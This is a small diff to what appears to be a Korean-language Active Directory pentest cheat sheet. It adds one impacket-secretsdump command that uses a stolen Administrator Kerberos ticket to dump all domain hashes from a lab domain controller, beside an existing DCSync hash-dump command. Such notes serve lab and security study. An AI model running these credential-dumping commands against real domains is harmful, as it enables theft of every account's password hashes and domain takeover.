@@ -593,6 +593,8 @@ KRB5CCNAME=Administrator@cifs_dc.phantom.vl@PHANTOM.VL.ccache nxc smb dc.phantom
 
 # DC로부터 모든 해시 덤프 (DCSync 권한 필요)
 secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
+
+KRB5CCNAME=Administrator@cifs_dc.phantom.vl@PHANTOM.VL.ccache impacket-secretsdump -k -no-pass -just-dc dc.phantom.vl
 ```
 
 ### Mimikatz
